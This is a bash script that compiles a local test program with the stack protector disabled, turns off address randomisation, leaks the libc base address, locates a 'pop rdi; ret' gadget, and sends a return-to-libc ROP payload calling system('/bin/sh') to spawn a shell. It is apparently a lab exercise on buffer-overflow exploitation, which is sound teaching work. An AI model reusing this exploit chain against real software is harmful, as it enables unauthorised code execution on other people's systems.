#!/bin/bash
gcc -fno-stack-protector -o victim victim.c
libc=`locate libc.so.6 | sed -n '1p;'`
poprdiretq=`xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"0x%x\n",$1-1}'`

SESSION=$USER
tmux -2 new-session -d -s $SESSION
# Setup a window for tailing log files
tmux new-window -t $SESSION:1 -n 'Exploit'
tmux split-window -h
tmux select-pane -t 0
tmux send-keys "setarch $(uname -m) -R ./victim > output0" C-m
tmux select-pane -t 1
sleep 1 #waiting for victim to start up
tmux send-keys "pid=`ps -C victim -o pid --no-headers | tr -d ' '`" C-m
tmux send-keys "grep -m 1 libc /proc/\$pid/maps | cut -d'-' -f1 > output1" C-m
#tmux send-keys "ps -o cmd,esp -C victim >> output1" C-m
sleep 1
tmux select-pane -t 0
tmux send-keys C-m
#just in case
tmux send-keys C-c

libcaddr=`cat output1 | awk '{print "0x" $0}'`
sysliboffset=`nm -D $libc | grep '\<system\>' | cut -d' ' -f1 | awk '{print "0x" $0}'`
buff=`sed -n 1p < output0`

gadget=$(($libcaddr+$poprdiretq))
sys=$(($libcaddr+$sysliboffset))
victim=$(($buff+64+24+8+0x60)) #not sure why, but it keeps shifting by 0x60

#stackptr=`grep victim output1 | rev | cut -d' ' -f1 | rev | awk '{print "0x7fff" $0}'`
(((printf %0144d 0; printf %016x $gadget | tac -rs..; printf %016x $victim | tac -rs..; printf %016x $sys | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch $(uname -m) -R ./victim

rm output0 output1
tmux kill-session -t $SESSION
